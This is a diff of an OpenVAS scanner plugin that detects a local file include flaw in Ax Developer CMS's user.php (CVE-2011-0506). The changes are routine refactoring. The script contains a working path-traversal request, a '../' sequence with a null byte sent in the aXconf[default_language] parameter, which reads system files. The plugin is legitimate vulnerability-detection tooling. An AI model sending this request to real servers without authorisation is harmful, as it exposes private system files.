@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_axdcms_45735.nasl 5651 2017-03-21 10:09:09Z cfi $
+# $Id: gb_axdcms_45735.nasl 5747 2017-03-28 12:18:28Z cfi $
 #
 # Ax Developer CMS 'user.php' Local File Include Vulnerability
 #
@@ -35,16 +35,15 @@ also possible.
 
 AxDCMS 0.1.1 is vulnerable; other versions may also be affected.";
 
-
 if (description)
 {
  script_id(103025);
- script_version("$Revision: 5651 $");
- script_tag(name:"last_modification", value:"$Date: 2017-03-21 11:09:09 +0100 (Tue, 21 Mar 2017) $");
+ script_version("$Revision: 5747 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-28 14:18:28 +0200 (Tue, 28 Mar 2017) $");
  script_tag(name:"creation_date", value:"2011-01-11 12:59:27 +0100 (Tue, 11 Jan 2011)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
-  script_cve_id("CVE-2011-0506");
+ script_cve_id("CVE-2011-0506");
  script_bugtraq_id(45735);
 
  script_name("Ax Developer CMS 'user.php' Local File Include Vulnerability");
@@ -52,7 +51,6 @@ if (description)
  script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/45735");
 
  script_tag(name:"qod_type", value:"remote_vul");
- script_summary("Determine if Ax Developer CMS is prone to a local file-include vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
@@ -66,26 +64,26 @@ if (description)
 include("http_func.inc");
 include("host_details.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
    
 port = get_http_port(default:80);
-
-if(!get_port_state(port))exit(0);
 if(!can_host_php(port:port))exit(0);
-dirs = make_list("/axdcms","/cms",cgi_dirs());
+
 files = traversal_files();
 
-foreach dir (dirs) {
+foreach dir( make_list_unique( "/axdcms", "/cms", cgi_dirs( port:port ) ) ) {
+
+  if( dir == "/" ) dir = "";
+
   foreach file (keys(files)) {
    
-    url = string(dir, "/modules/profile/user.php?aXconf[default_language]=",crap(data:"../",length:3*18),files[file],"%00"); 
+    url = string(dir, "/modules/profile/user.php?aXconf[default_language]=",crap(data:"../",length:3*18),files[file],"%00");
 
     if(http_vuln_check(port:port, url:url,pattern:file)) {
-     
-      security_message(port:port);
-      exit(0);
-
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
     }
   }
 }
-exit(0);
+
+exit( 99 );
